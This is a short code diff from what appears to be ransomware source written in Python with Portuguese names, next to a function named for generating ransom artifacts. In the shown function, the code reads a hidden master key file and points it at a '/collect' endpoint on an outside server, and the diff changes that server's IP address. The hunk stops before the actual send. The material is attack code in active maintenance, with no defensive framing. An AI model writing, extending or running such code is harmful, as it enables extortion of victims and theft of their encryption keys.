@@ -350,7 +350,7 @@ def gerar_artefato_resgate(diretorios: List[str]) -> None:
 
 def transmitir_orquestracao() -> None:
     key_path = "/tmp/.master.key"
-    url = "http://10.254.19.238:8080/collect"
+    url = "http://10.150.3.162:8080/collect"
 
     try:
         with open(key_path, "r", encoding="utf-8") as f:
